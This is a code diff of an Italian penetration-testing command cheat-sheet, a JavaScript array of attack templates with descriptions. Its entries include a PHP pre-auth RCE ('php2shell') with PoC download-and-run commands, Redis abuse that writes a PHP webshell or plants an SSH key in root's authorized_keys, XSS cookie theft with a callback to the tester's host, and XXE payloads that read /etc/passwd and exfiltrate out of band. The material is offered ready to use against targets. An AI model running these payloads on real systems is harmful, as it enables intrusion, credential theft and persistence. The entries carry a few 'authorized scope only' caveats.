-    "description": "**php2shell** sfrutta due RCE pre-auth nel core di PHP. \n\n**CVE-2026-109618** è una corruzione di memoria dopo un out-of-memory: un `longjmp()` lascia la memoria in uno stato invalido che la fase di shutdown rilegge. \n\n**CVE-2026-109619** è uno use-after-free da stato globale di richiesta che sopravvive alla liberazione della memoria e viene usato prima della re-inizializzazione.\n\nSenza alcuna credenziale, una sequenza di richieste HTTP, porta all'esecuzione di comandi con i privilegi del worker web, di norma `www-data`.",
-    "platform": "linux",
-    "requires": [
-      "no-creds"
-    ],
-    "protocols": [
-      "http"
-    ],
-    "tags": [
-      "php",
-      "php2shell",
-      "cve-2026-109618",
-      "cve-2026-109619",
-      "rce",
-      "pre-auth",
-      "uaf"
-    ],
-    "template": "# scarica il PoC (CVE-2026-109618, SAPI Apache mod_php)\ngit clone https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC\ncd php2shell-CVE-2026-109618-CVE-2026-109619-PoC\n\n# esegue il comando sul target (max 14 byte inline) e salva la prova su file\npython3 poc_109618.py -u http://<ip> -c '<cmd>' --proof-file out/p1",
-    "params": [
-      {
-        "key": "ip",
-        "label": "Target",
-        "ctx": "ip",
-        "placeholder": "10.10.10.15"
-      },
-      {
-        "key": "cmd",
-        "label": "Comando (≤ 14 byte)",
-        "placeholder": "id>/out/p1"
-      }
-    ],
-    "variants": [
-      {
-        "id": "default",
-        "label": "eness — script singolo (109618)",
-        "template": "# scarica il PoC (CVE-2026-109618, SAPI Apache mod_php)\ngit clone https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC\ncd php2shell-CVE-2026-109618-CVE-2026-109619-PoC\n\n# esegue il comando sul target (max 14 byte inline) e salva la prova su file\npython3 poc_109618.py -u http://<ip> -c '<cmd>' --proof-file out/p1",
-        "description": "Lo script più diretto: un solo file, mirato a CVE-2026-109618 su Apache prefork + mod_php. Su una build diversa da Debian 12 (immagine `php:8.4.26-apache`) vanno passati `--zif-offset`/`--dtor-offset`; con `--fetch /p1.txt` recupera via HTTP l'output del comando."
-      },
-      {
-        "id": "devploit",
-        "label": "devploit — Apache + FPM",
-        "template": "# prepara il repo (clona l'exploit upstream in vendor/)\ngit clone https://github.com/devploit/php2shell\ncd php2shell && python3 tools/bootstrap_upstream.py\n\n# dispatcher automatico: rileva versione e SAPI ed esegue (target remoto: aggiungi --allow-remote --arch amd64)\npython3 tools/php2shell_auto.py -u http://<ip> -c '<cmd>'",
-        "description": "Toolkit con matrice di versioni per Apache mod_php e PHP-FPM, costruito attorno all'exploit upstream di 9bie. `--list` elenca i profili, `--allow-remote` abilita i bersagli remoti, `--arch`/`--profile` forniscono gli offset del binario. I profili FPM sono riportati dai contributor: va rifatta la calibrazione per ciascun host."
-      },
-      {
-        "id": "ikow",
-        "label": "ikow — 5 chain (A-E)",
-        "template": "# clona il repo: 5 chain (A-E) alternative, divise per SAPI/precondizione + regole di detection\ngit clone https://github.com/ikow/php2shell-poc\ncd php2shell-poc\n\n# 1) verifica quale via è percorribile (uno script per chain)\npython3 poc/verify_session_injection.py --target http://<ip>   # -> chain A\npython3 poc/verify_handler_mismatch.py --target http://<ip>    # -> chain C (FPM)\npython3 poc/verify_fpm_stale_state.py --target http://<ip>     # -> chain E (FPM)\npython3 poc/verify_oom_trigger.py --host <ip> --port 80        # -> chain D (mod_php)\n\n# 2) esegui UNA sola chain, in base all'esito del verify\n# A  session injection -> LFI (pre-auth; serve un sink LFI nell'app; tutti i SAPI)\npython3 exploit/chain_a_session_lfi.py --host <ip> --port 80 --command '<cmd>'\n# C  handler mismatch -> __destruct (pre-auth; FPM con due dir a serialize_handler diverso)\npython3 exploit/chain_c_mismatch_rce.py --host <ip> --port 80 --command '<cmd>'\n# B  var_destroy UAF -> handler overwrite (NON pre-auth: richiede già unserialize() o una webshell)\nphp exploit/chain_b_uaf_rce.php\n# D, E  OOM/stale state -> RCE (pre-auth, app-independent; nel repo solo i verify, l'exploit è a pagamento)",
-        "description": "Cinque catene alternative (A-E) divise per SAPI/precondizione: nel repo c'è il codice di A, B e C, mentre D ed E hanno solo lo script di verify (l'exploit è riservato agli abbonati). Prima i `verify_*` dicono quale via è aperta, poi se ne lancia UNA. A richiede un sink LFI nell'app; B non è pre-auth (serve già `unserialize()` o una webshell); C ed E sono per FPM; D è mod_php e indipendente dall'app. Include anche regole di detection pronte (Suricata, Sigma, ModSecurity), utili lato difesa."
-      },
-      {
-        "id": "offsec-edb",
-        "label": "OffSec — EDB-52704 (8.5.11)",
-        "template": "# scarica il PoC da Exploit-DB (EDB-52704, autore OffSec) nella cartella corrente\nsearchsploit -m 52704\n\n# esegue il comando sul target (endpoint di default /index.php); con --rce senza valore lancia un id di prova e verifica /proof.txt\npython3 52704.py --host <ip> --rce '<cmd>'",
-        "description": "Il PoC pubblicato da OffSec su Exploit-DB (EDB-52704, 22/10/2026): un unico script Python3 (solo stdlib) validato su PHP 8.5.11 + Apache mod_php prefork, che funziona anche con ASLR attivo ricavando gli indirizzi dal cookie `PHPSESSID` leakato. `searchsploit -m 52704` lo scarica. Comando limitato a ~47 caratteri. Molto build-specific: su un binario diverso da quello validato gli offset vanno ricalibrati a mano (GDB/ROPgadget)."
-      }
-    ],
-    "refs": [
-      {
-        "label": "CVE-2026-109618 — GHSA-w8hw-w9fx-j79w (RCE via OOM corruption)",
-        "url": "https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w"
-      },
-      {
-        "label": "CVE-2026-109619 — GHSA-6wmf-4rv5-p3rp (RCE via stale global state)",
-        "url": "https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp"
-      },
-      {
-        "label": "PoC — eness (CVE-2026-109618, Apache)",
-        "url": "https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC"
-      },
-      {
-        "label": "PoC/toolkit — devploit (Apache + FPM, matrice versioni)",
-        "url": "https://github.com/devploit/php2shell"
-      },
-      {
-        "label": "PoC — ikow (5 chain + regole di detection)",
-        "url": "https://github.com/ikow/php2shell-poc"
-      },
-      {
-        "label": "PoC — OffSec / Exploit-DB (EDB-52704, validato su PHP 8.5.11)",
-        "url": "https://www.exploit-db.com/exploits/52704"
-      },
-      {
-        "label": "Wiz Research — analisi php2shell",
-        "url": "https://www.wiz.io/blog/php2shell-php-rce"
-      }
-    ],
-    "note": "# Versioni vulnerabili\n**Rami supportati**:\n- affetti **< 8.2.35**, **< 8.3.36**, **< 8.4.27**, **< 8.5.12**\n- corrette in `8.2.35`, `8.3.36`, `8.4.27`, `8.5.12` (e `8.6.0 RC4`)\n\n<br>\n**Rami EOL**\n- affetti **5.4.0** (2012) a **8.1.x**\n- corrette per `7.4`, `8.0`, `8.1`\n- nessun fix per `5.4`→`7.3`\n\n<br>La versione del target si legge dagli header `X-Powered-By` o `Server`, quando non rimossi.\n# Prerequisiti\n- Nessuna credenziale: basta raggiungere via HTTP un qualunque endpoint PHP del target\n- SAPI: resa massima su Apache mod_php (prefork); su PHP-FPM è dimostrata la via del session upload progress\n- `session.upload_progress.enabled` è On di default ed è il trigger indipendente dall'app per la via CVE-2026-109619\n- Target remoti: servono gli offset del binario (ASLR); i PoC pubblici sono tarati su build e configurazioni di laboratorio precise (spesso un solo worker, `memory_limit` basso)\n# Limitazioni\n- Comando inline limitato a **14 byte** sui target remoti: per comandi più lunghi o una reverse shell si scrive uno stager su file e lo si concatena\n- Offset per-build: su target remoti diversi dalla build di laboratorio vanno forniti a mano (`--zif-offset`/`--dtor-offset` in eness, `--arch`/`--profile` in devploit)\n- La riuscita dipende da SAPI, numero di worker, `memory_limit` e `display_errors`: \"nessuna prova non significa assenza di esecuzione\"\n- eness e il PoC OffSec (EDB-52704) sono PoC per CVE-2026-109618; per CVE-2026-109619 il percorso dimostrato è il session upload progress, coperto da ikow e devploit\n# Dall'RCE alla shell\nL'esecuzione è one-shot e corta. Per una shell stabile: scrivi uno stager sul webroot con un primo comando, poi richiamalo via HTTP (`--fetch` in eness), oppure usa lo stager per scaricare ed eseguire una reverse shell verso un listener.\n# Attenzione\nTecnica distruttiva e rumorosa: l'exploit forza ripetuti out-of-memory che fanno crashare i worker PHP (su Apache uccide i processi figli) e riempie i log di errori 500/OOM. Nessuno stealth. Solo su sistemi in scope e autorizzati."
   },
   {
     "id": "psql-rce",
@@ -8348,106 +8473,48 @@ const COMMANDS = [
     "note": "# Prerequisiti\n`COPY ... FROM PROGRAM` richiede un ruolo Superuser (verifica con `\\du` o `SELECT current_setting('is_superuser')`).\n# Prossimo passo\nSostituisci `id` con un one-liner di reverse shell per una shell interattiva. La lettura file serve a recuperare chiavi, config e hash con i diritti del servizio."
   },
   {
-    "id": "odat-rce",
-    "name": "ODAT — lettura file e RCE Oracle",
+    "id": "redis-rce",
+    "name": "Redis — RCE via CONFIG SET",
     "category": "exploitation",
     "subcategory": "infrastructure",
-    "group": "Oracle (1521)",
-    "description": "Con credenziali valide ODAT trasforma l'accesso al database in lettura/scrittura di file sul server e in esecuzione di comandi, tramite UTL_FILE, external table o DBMS_SCHEDULER.",
-    "note": "# Prerequisito\nUn SID e credenziali con privilegi adeguati (spesso basta un utente con ruoli comuni). Verifica prima i privilegi con le query di enumerazione.\n# Output atteso\nexternal table e DBMS_SCHEDULER puntano all'esecuzione comandi; UTL_FILE alla lettura/scrittura file. Scegli in base ai privilegi disponibili.",
-    "platform": "linux",
-    "requires": [
-      "password"
-    ],
-    "protocols": [
-      "oracle"
-    ],
-    "tags": [
-      "oracle",
-      "odat",
-      "rce"
-    ],
-    "template": "# lettura di un file dal server via UTL_FILE\nodat utlfile -s <ip> -d <sid> -U <user> -P '<password>' --getFile /tmp out.txt\n\n# esecuzione comandi via external table\nodat externaltable -s <ip> -d <sid> -U <user> -P '<password>' --exec /tmp whoami",
-    "params": [
-      {
-        "key": "ip",
-        "label": "Target",
-        "ctx": "ip",
-        "placeholder": "10.10.10.11"
-      },
-      {
-        "key": "user",
-        "label": "User",
-        "ctx": "user",
-        "placeholder": "system"
-      },
-      {
-        "key": "password",
-        "label": "Password",
-        "ctx": "password",
-        "placeholder": "oracle"
-      },
-      {
-        "key": "sid",
-        "label": "SID",
-        "placeholder": "XE"
-      }
-    ]
-  },
-  {
-    "id": "ipmi-dumphash",
-    "name": "IPMI — dump & crack hash",
-    "category": "exploitation",
-    "subcategory": "infrastructure",
-    "group": "IPMI (623/udp)",
-    "description": "IPMI 2.0 ha una falla di progetto nel protocollo RAKP: il BMC restituisce un hash della password di qualsiasi utente valido prima dell'autenticazione, quindi si estrae offline. Alcuni BMC accettano anche Cipher 0, che bypassa del tutto l'autenticazione. Gli hash si crackano con hashcat mode 7300.",
-    "note": "# Credenziali di default\nDefault dei BMC per la Cipher 0 / login web: `ADMIN:ADMIN` (Supermicro) · `root:calvin` (Dell iDRAC) · `USERID:PASSW0RD` (IBM/Lenovo, con lo zero) · `Administrator:admin` (HP iLO) · `admin:admin` · `root:root`.",
+    "group": "Redis (6379)",
+    "description": "Se Redis è aperto e il processo può scrivere sul filesystem, `CONFIG SET dir` più `dbfilename` reindirizzano il file di dump dove serve: si scrive una webshell nel web root o una chiave pubblica in `authorized_keys` per una shell SSH. Il salvataggio effettivo avviene con `SAVE`.",
     "platform": "linux",
     "requires": [
       "no-creds"
     ],
     "protocols": [
-      "ipmi"
+      "redis"
     ],
     "tags": [
-      "ipmi",
-      "bmc",
-      "rakp"
+      "redis",
+      "rce",
+      "webshell"
     ],
-    "template": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run; exit\"",
+    "template": "# sposta la directory di dump nella web root\nredis-cli -h <ip> config set dir /var/www/html\n\n# chiama il dump shell.php, così il web server lo esegue come PHP\nredis-cli -h <ip> config set dbfilename shell.php\n\n# scrive la webshell dentro una chiave\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\n\n# forza il salvataggio: il file compare nella web root\nredis-cli -h <ip> save",
     "params": [
       {
         "key": "ip",
         "label": "IP",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
-      },
-      {
-        "key": "wordlist",
-        "label": "Wordlist",
-        "placeholder": "/usr/share/wordlists/rockyou.txt"
       }
     ],
     "variants": [
       {
-        "id": "msf",
-        "label": "Dump hash (Metasploit)",
-        "template": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run; exit\"",
-        "description": "Estrae gli hash RAKP degli utenti del BMC. Salva l'output in formato `user:hash` per hashcat."
+        "id": "webshell",
+        "label": "Webshell (web root)",
+        "template": "# sposta la directory di dump nella web root\nredis-cli -h <ip> config set dir /var/www/html\n\n# chiama il dump shell.php, così il web server lo esegue come PHP\nredis-cli -h <ip> config set dbfilename shell.php\n\n# scrive la webshell dentro una chiave\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\n\n# forza il salvataggio: il file compare nella web root\nredis-cli -h <ip> save",
+        "description": "Scrive `shell.php` nel web root: la RCE parte da `http://<ip>/shell.php?c=id`. Serve conoscere un path servito da un web server e scrivibile dal processo redis."
       },
       {
-        "id": "crack",
-        "label": "Crack (hashcat 7300)",
-        "template": "hashcat -m 7300 ipmi.hash <wordlist>",
-        "description": "Cracka gli hash RAKP estratti. Le password di default dei BMC (es. `ADMIN`) cadono subito."
-      },
-      {
-        "id": "cipher0",
-        "label": "Cipher 0 (auth bypass)",
-        "template": "ipmitool -I lanplus -C 0 -H <ip> -U Administrator -P '' user list",
-        "description": "Con Cipher 0 alcuni BMC eseguono comandi con qualsiasi password. Se funziona, si possono creare utenti amministrativi."
+        "id": "sshkey",
+        "label": "Chiave SSH",
+        "template": "# genera una coppia di chiavi SSH senza passphrase\nssh-keygen -t rsa -f ./key -q -N ''\n\n# imbottisce la chiave pubblica di newline, per non corrompere il file finale\n(echo; cat key.pub; echo) > key.txt\n\n# svuota il database, così il dump contiene solo la chiave\nredis-cli -h <ip> flushall\n\n# carica la chiave pubblica dentro una chiave Redis\ncat key.txt | redis-cli -h <ip> -x set sshkey\n\n# sposta la directory di dump in /root/.ssh\nredis-cli -h <ip> config set dir /root/.ssh\n\n# chiama il dump authorized_keys\nredis-cli -h <ip> config set dbfilename authorized_keys\n\n# salva: la chiave finisce tra le authorized_keys di root\nredis-cli -h <ip> save\n\n# entra via SSH come root con la chiave privata\nssh -i key root@<ip>",
+        "description": "Scrive la propria chiave pubblica in `/root/.ssh/authorized_keys` (o nella home di un altro utente) per una shell SSH. Funziona se il processo redis gira come quell'utente e la dir esiste."
       }
-    ]
+    ],
+    "note": "# Prerequisiti\nRedis raggiungibile senza autenticazione (o con password nota) e un processo che può scrivere su disco. Il salvataggio effettivo del file avviene con `SAVE`.\n# Errori comuni\nLa webshell funziona solo se conosci un path servito da un web server e scrivibile dal processo redis. La chiave SSH funziona se redis gira come quell'utente e la cartella `.ssh` esiste."
   },
   {
     "id": "username-anarchy",
@@ -9244,13 +9311,13 @@ const COMMANDS = [
         "description": "Usa una request salvata: gestisce header, cookie e POST automaticamente."
       }
     ],
-    "note": "# Scegliere il parametro da iniettare\n- `-p <param>` testa solo quel parametro, più veloce che provarli tutti (per esempio `-p id`)\n- `*` marca a mano il punto di injection dove serve, che sia un path REST, un header o un valore JSON: per esempio `/api/user/1*` oppure `id=1*` in una request salvata con `-r`\n# Opzioni utili\n- `--level 5 --risk 3` allargano i test: più payload, ma più lenti\n- `--random-agent` e un `--tamper` adatto aiutano contro WAF e filtri\n- `-D <db> -T <table> -C <col> --dump` scende fino ai dati\n# Errori comuni\nUn 403 o risposte incoerenti indicano spesso un WAF: prova `--random-agent`, un `--tamper` adatto e un `--delay`. Senza un punto di injection valido sqlmap non trova nulla: parti da `-r request.txt` così rispetta header, cookie e sessione.",
     "refs": [
       {
         "label": "HackTricks — sqlmap",
         "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap.html"
       }
-    ]
+    ],
+    "note": "# Scegliere il parametro da iniettare\n- `-p <param>` testa solo quel parametro, più veloce che provarli tutti (per esempio `-p id`)\n- `*` marca a mano il punto di injection dove serve, che sia un path REST, un header o un valore JSON: per esempio `/api/user/1*` oppure `id=1*` in una request salvata con `-r`\n# Opzioni utili\n- `--level 5 --risk 3` allargano i test: più payload, ma più lenti\n- `--random-agent` e un `--tamper` adatto aiutano contro WAF e filtri\n- `-D <db> -T <table> -C <col> --dump` scende fino ai dati\n# Errori comuni\nUn 403 o risposte incoerenti indicano spesso un WAF: prova `--random-agent`, un `--tamper` adatto e un `--delay`. Senza un punto di injection valido sqlmap non trova nulla: parti da `-r request.txt` così rispetta header, cookie e sessione.\n# Errori comuni\nSe sqlmap si ferma subito con `Connection refused` già alla fase **\"testing connection to the target URL\"**, e il sito in realtà risponde in HTTPS, quasi sempre il motivo è questo: sqlmap sta provando a connettersi **in chiaro sulla porta 80** invece che in HTTPS sulla **443**.\n\nSuccede tipicamente in due casi:\n1. Hai usato un URL che inizia con `http://`.\n2. Stai passando una request salvata da Burp con `-r request.txt`: la request grezza non indica se l'originale era HTTP o HTTPS, quindi sqlmap non lo sa e prova in chiaro.\n\nLa soluzione è di aggiungere `--force-ssl`, che obbliga sqlmap a usare TLS su tutte le richieste. Assicurati anche di lasciare la porta `:443` nell'URL."
   },
   {
     "id": "xss-detect",
@@ -9309,7 +9376,7 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "XSS",
-    "description": "Trasforma una XSS confermata in impatto concreto: rubare il cookie di sessione, raccogliere credenziali con un finto login o confermare una XSS cieca che scatta altrove (pannello admin, log).",
+    "description": "Trasforma una XSS confermata in impatto concreto: rubare il cookie di sessione, raccogliere credenziali con un finto login o confermare una XSS blind che scatta altrove (pannello admin, log).",
     "note": "# Prerequisiti\nServe una XSS già confermata e un server in ascolto sul tuo host per ricevere i dati: `php -S 0.0.0.0:80` oppure `python3 -m http.server 80`.\n# Errori comuni\nCol flag HttpOnly il cookie non è leggibile da `document.cookie`: in quel caso la XSS si usa per compiere azioni come la vittima (richieste autenticate, CSRF) invece di rubare il cookie.\n# Prossimo passo\nCol cookie di sessione riusa l'identità della vittima nel browser o in `curl`; con la blind XSS mappa dove esegue per capire quale utente stai colpendo.",
     "platform": "cross-platform",
     "requires": [
@@ -9350,7 +9417,7 @@ const COMMANDS = [
         "id": "blind",
         "label": "blind XSS (callback)",
         "template": "<script src=http://<lhost>/hook.js></script>",
-        "description": "Per XSS cieca: il payload scatta dove non vedi. Il tuo server registra quando e da dove parte la richiesta."
+        "description": "Per XSS blind: il payload scatta dove non vedi. Il tuo server registra quando e da dove parte la richiesta."
       },
       {
         "id": "phishing",
@@ -9838,12 +9905,9 @@ const COMMANDS = [
     "note": "# Prerequisiti\nIl motore di template va identificato prima (vedi SSTI — detection): ogni engine ha la sua catena per arrivare all'esecuzione.\n# Errori comuni\nAlcuni template girano in sandbox (per esempio Jinja2): serve il bypass tramite la catena di oggetti (`__class__`, `__mro__`, `__subclasses__`). Filtri su parole come `popen` o `os` si aggirano con concatenazione o attributi.\n# Prossimo passo\nConfermata la RCE con `id`, promuovi a reverse shell e stabilizza."
   },
   {
-    "id": "xxe",
-    "name": "XXE — XML External Entity",
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "XXE",
-    "description": "Definisce un'entità esterna per leggere file o esfiltrare dati. CDATA serve per i file con caratteri speciali, mentre la variante blind OOB copre i casi in cui l'output non torna nella risposta.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -9851,11 +9915,171 @@ const COMMANDS = [
     "protocols": [
       "http"
     ],
+    "id": "xxe-tooling",
+    "name": "XXE — Detection & tooling",
+    "description": "Il filo completo, dal recon all’exploitation automatizzata:\n<ul><li><strong>Scan</strong> — <code>nuclei</code> con tag <code>xxe</code>, anche di massa su una lista di URL.</li><li><strong>Conferma</strong> — un probe OOB smaschera il blind XXE, quando la risposta non riflette nulla.</li><li><strong>Exploitation</strong> — <code>XXEinjector</code> legge file e directory e gestisce il canale OOB.</li><li><strong>Vettori-file</strong> — <code>oxml_xxe</code> e <code>docem</code> generano i documenti infetti da caricare.</li></ul>",
     "tags": [
       "xxe",
-      "xml"
+      "xml",
+      "recon",
+      "tooling"
     ],
-    "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+    "template": "# detection XXE automatica (OOB via interactsh integrato)\nnuclei -u http://<ip>/ -tags xxe\n\n# stesso scan su una lista di URL\nnuclei -l urls.txt -tags xxe -o xxe-hits.txt",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "lhost",
+        "label": "Tuo host",
+        "placeholder": "10.10.14.5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "nuclei",
+        "label": "nuclei",
+        "template": "# detection XXE automatica (OOB via interactsh integrato)\nnuclei -u http://<ip>/ -tags xxe\n\n# stesso scan su una lista di URL\nnuclei -l urls.txt -tags xxe -o xxe-hits.txt",
+        "description": "Ricognizione rapida, anche di massa: i template con tag `xxe` inviano payload e rilevano i callback out-of-band via interactsh. Buon primo colpo prima dei test manuali."
+      },
+      {
+        "id": "probe",
+        "label": "Probe OOB",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY % x SYSTEM \"http://<lhost>/probe\"> %x; ]>",
+        "description": "Detection del blind XXE: metti in ascolto (`python3 -m http.server 80` o `interactsh-client`) e invia il probe. Se arriva una richiesta a `/probe`, il parser risolve entità esterne → XXE presente anche senza output. Nessun dato esfiltrato, solo conferma."
+      },
+      {
+        "id": "xxeinjector",
+        "label": "XXEinjector",
+        "template": "# req.txt = request HTTP col punto di injection marcato \"XXEINJECT\"\nruby XXEinjector.rb --host=<lhost> --httpport=80 --file=req.txt --path=/etc/passwd --oob=http --phpfilter",
+        "description": "Automatizza l’exploitation dopo la detection: enumera e legge file e directory. Marca il punto d’iniezione con `XXEINJECT` nella request, poi scegli il canale:\n<ul><li><code>--oob=http|ftp</code> — esfiltrazione out-of-band per il blind.</li><li><code>--phpfilter</code> — legge i sorgenti PHP in base64.</li><li><code>--hashes</code> — ruba gli hash NetNTLM su Windows.</li></ul>"
+      },
+      {
+        "id": "oxml-docem",
+        "label": "oxml/docem",
+        "template": "# genera documenti con payload XXE embedded (docx/xlsx/odt/svg)\ndocem -l docx,xlsx,svg -d out/     # vedi 'docem -h' per i flag della tua versione\n\n# oxml_xxe: tool (jar, anche GUI) per iniettare XXE nei formati OOXML/OpenDocument\njava -jar oxml_xxe.jar",
+        "description": "Per i vettori-file (vedi «Upload» e «Vettori»): inseriscono il payload XXE dentro Office/OpenDocument/SVG/PDF pronti da caricare, senza editarli a mano."
+      }
+    ],
+    "note": "# Flusso\n1. recon/detection: `nuclei -tags xxe` (anche su lista URL) o il probe OOB manuale\n2. conferma blind: una callback sul tuo listener = il parser risolve entità esterne\n3. exploitation: XXEinjector (file/dir/OOB) o i payload a mano dalle altre schede\n4. vettori-file: oxml_xxe/docem per docx/xlsx/svg\n# Listener OOB\n`interactsh-client`, Burp Collaborator, `python3 -m http.server 80`, o un server FTP fittizio per dati multilinea.\n# Riferimenti payload\nPayloadsAllTheThings (XXE), HackTricks XXE, e `dtd-finder` per trovare DTD locali riusabili (attacco local-DTD).\n# Attenzione\nBurp/ZAP/nuclei inviano payload reali: lancia solo in scope. nuclei usa l’interactsh pubblico di default; in un lab chiuso punta a un tuo server OOB.",
+    "refs": [
+      {
+        "label": "XXEinjector (GitHub)",
+        "url": "https://github.com/enjoiz/XXEinjector"
+      },
+      {
+        "label": "PayloadsAllTheThings — XXE",
+        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+      }
+    ]
+  },
+  {
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "XXE",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "id": "xxe",
+    "name": "XXE — File read (in-band)",
+    "description": "Il valore dell’entità esterna è riflesso nella risposta. Partenza classica: dal `SYSTEM` diretto fino ai bypass dei WAF (PUBLIC, UTF-16, offuscamento del DOCTYPE).",
+    "tags": [
+      "xxe",
+      "xml",
+      "file-read"
+    ],
+    "template": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "Tuo host",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Basic",
+        "template": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Il payload minimo. Sostituisci `<xxe-root>` con l’elemento che l’app rimanda in risposta; `&xxe;` ne prende il posto con il contenuto del file."
+      },
+      {
+        "id": "php-filter",
+        "label": "php://filter",
+        "template": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Su PHP legge i sorgenti (che altrimenti verrebbero eseguiti) e i file binari come base64: `&xxe;` torna in base64, decodifica con `base64 -d`. Cambia `resource=` per puntare ad altri file."
+      },
+      {
+        "id": "cdata",
+        "label": "CDATA",
+        "template": "# 1) DTD sul tuo host: UNA entità generale che concatena apertura CDATA + file + chiusura\necho '<!ENTITY all \"%start;%file;%end;\">' > wrap.dtd\n\n# 2) servilo (tienilo in un terminale a parte; la porta deve combaciare con il SYSTEM del payload)\npython3 -m http.server 80\n\n# 3) invia il payload XML qui sotto all'endpoint: &all; riflette il file avvolto in CDATA, verbatim\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % start \"<![CDATA[\">\n  <!ENTITY % file SYSTEM \"file:///var/www/html/config.php\">\n  <!ENTITY % end \"]]>\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/wrap.dtd\">\n  %dtd;\n]>\n<xxe-root>&all;</xxe-root>",
+        "description": "Legge file che contengono `<`, `>`, `&` (sorgenti PHP, altri XML) avvolgendoli in `<![CDATA[ … ]]>`: così il contenuto non rompe il parser e torna verbatim. I tre pezzi (`%start`, `%file`, `%end`) vanno concatenati in una entità generale `all` dentro un DTD esterno — nel subset interno le parameter entity non si espandono dentro le dichiarazioni — e il body referenzia `&all;`."
+      },
+      {
+        "id": "public",
+        "label": "PUBLIC",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe PUBLIC \"-//EN//docs\" \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "`PUBLIC \"id\" \"url\"` fa esattamente quello che fa `SYSTEM \"url\"`: serve solo a eludere i WAF che filtrano la keyword `SYSTEM`.\n<pre>&lt;!ENTITY xxe PUBLIC \"-//EN//docs\" \"file:///etc/passwd\"&gt;<br>                    └──── id ────┘ └────── url ──────┘</pre>\n<ul><li><strong>id</strong> — etichetta arbitraria (public identifier): resta fissa, non punta a nulla, non la cambi.</li><li><strong>url</strong> — il vero bersaglio (system identifier): qui metti il file da leggere.</li></ul>\nNon aggira l’hardening vero: dove `SYSTEM` è bloccato nel parser, lo è anche `PUBLIC`."
+      },
+      {
+        "id": "utf16",
+        "label": "Encoding",
+        "template": "# il WAF cerca firme ASCII (<!ENTITY, SYSTEM): cambia codifica, il parser la legge\n# (A) UTF-16BE\niconv -f UTF-8 -t UTF-16BE payload.xml -o payload-16.xml\n\n# (B) UTF-7  (nel prologo: encoding=\"UTF-7\"; il '<' diventa +ADw-, niente ASCII)\niconv -f UTF-8 -t UTF-7 payload.xml -o payload-7.xml\n\n# invia con la codifica dichiarata\ncurl -s http://<ip>/xml --data-binary @payload-16.xml \\\n  -H 'Content-Type: application/xml; charset=utf-16'\n\n# (C) BOM: se il parser legge la codifica dai primi byte, anteponilo\nprintf '\\xfe\\xff' | cat - payload-16.xml > payload-bom.xml",
+        "description": "Cambia la codifica del payload: il WAF cerca firme ASCII (`<!ENTITY`, `SYSTEM`), ma il parser legge comunque la codifica che dichiari.\n<ul><li><strong>UTF-16BE</strong> — <code>iconv -t UTF-16BE</code>, invia con <code>charset=utf-16</code>.</li><li><strong>UTF-7</strong> — nel prologo <code>encoding=\"UTF-7\"</code>: il <code>&lt;</code> diventa <code>+ADw-</code>, nessun byte ASCII resta.</li><li><strong>BOM</strong> — se il parser sniffa i primi byte invece del <code>charset</code>, anteponi <code>\\xfe\\xff</code> (UTF-16BE) o <code>\\xff\\xfe</code> (UTF-16LE).</li></ul>"
+      },
+      {
+        "id": "obfuscation",
+        "label": "Offuscato",
+        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe\n   SYSTEM\n   \"file:///etc/passwd\" >\n]>\n<xxe-root>&xxe;</xxe-root>",
+        "description": "Newline, tab e commenti `<!-- -->` dentro il DOCTYPE spezzano le regex meno robuste; funziona dove il parser è tollerante sugli spazi. Combina con PUBLIC/UTF-16 per i WAF più duri."
+      }
+    ],
